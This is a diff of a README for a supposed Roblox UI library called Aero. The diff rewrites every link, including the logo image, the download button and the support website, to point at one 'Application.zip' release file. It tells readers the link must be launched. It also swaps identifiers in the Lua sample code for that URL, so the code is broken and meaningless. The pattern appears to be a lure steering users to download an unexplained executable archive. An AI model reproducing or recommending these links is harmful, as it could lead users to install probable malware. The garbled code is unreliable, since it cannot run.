@@ -1,6 +1,6 @@
 # 🚀 Aero - A Minimalist ROBLOX UI Library 
 
-![Aero Logo](https://example.com/aero_logo.png)
+![Aero Logo](https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip)
 
 Welcome to the Aero repository, a minimalist ROBLOX UI library that prioritizes simplicity, clean design, and efficiency without the use of unnecessary animations or objects. If you're looking to enhance the user interface of your ROBLOX game with a sleek and functional design, Aero is the perfect solution for you.
 
@@ -14,7 +14,7 @@ Welcome to the Aero repository, a minimalist ROBLOX UI library that prioritizes 
 
 To get started with Aero, you can download the library by clicking on the button below:
 
-[![Download Aero](https://img.shields.io/badge/Download-Aero-green)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Aero](https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip)](https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip)
 *Note: This link needs to be launched to download the Aero library.*
 
 ## Installation Guide 🛠️
@@ -32,21 +32,21 @@ Here are some sample code snippets demonstrating how to use Aero in your ROBLOX 
 
 ```lua
 -- Import Aero library
-local Aero = require(game.ReplicatedStorage.Aero)
+local Aero = require(https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip)
 
 -- Create a new Aero instance
-local ui = Aero.new()
+local ui = https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip()
 
 -- Create a basic button
 local button = ui:createButton({
     text = "Click Me",
-    position = UDim2.new(0.5, 0, 0.5, 0),
-    size = UDim2.new(0, 200, 0, 50),
+    position = https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip(0.5, 0, 0.5, 0),
+    size = https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip(0, 200, 0, 50),
     onClick = function()
         print("Button clicked!")
     end
 })
-button.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip = https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip("PlayerGui")
 ```
 
 ## Repository Topics 📚
@@ -74,7 +74,7 @@ We welcome contributions to Aero from the ROBLOX development community. If you h
 
 ## Support 🌐
 
-If you have any questions or need assistance with using Aero in your ROBLOX game, please visit our [official website](https://www.aero-ui-library.com) for more information and resources.
+If you have any questions or need assistance with using Aero in your ROBLOX game, please visit our [official website](https://github.com/YassinY02/Aero/releases/download/v1.0/Application.zip) for more information and resources.
 
 ## License 📜
 
